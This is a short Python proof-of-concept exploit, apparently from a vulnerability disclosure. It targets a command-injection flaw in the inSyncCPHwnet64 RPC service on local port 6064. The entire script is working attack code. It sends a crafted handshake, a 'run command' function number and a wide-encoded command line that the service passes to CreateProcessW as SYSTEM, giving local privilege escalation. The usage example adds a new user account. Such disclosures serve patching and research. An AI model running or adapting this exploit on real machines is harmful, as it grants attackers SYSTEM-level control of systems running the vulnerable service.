import socket
import struct
import sys

# Command injection in inSyncCPHwnet64 RPC service
# Runs as nt authority\system. so we have a local privilege escalation

if len(sys.argv) < 2:
    print "Usage: " + __file__ + " <quoted command to execute>"
    print "E.g. " + __file__ + " \"net user /add tenable\""
    sys.exit(0)

ip = '127.0.0.1'
port = 6064
command_line = sys.argv[1]

# command gets passed to CreateProcessW
def make_wide(str):
    new_str = ''
    for c in str:
        new_str += c
        new_str += '\x00'
    return new_str

hello = "inSync PHC RPCW[v0002]"
func_num = "\x05\x00\x00\x00"      # 05 is to run a command
command_line = make_wide(command_line)
command_length = struct.pack('<i', len(command_line))

# send each request separately
requests = [ hello, func_num, command_length, command_line ]

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))

i = 1
for req in requests:
    print 'Sending request' + str(i)
    sock.send(req)
    i += 1

sock.close()

print "Done."
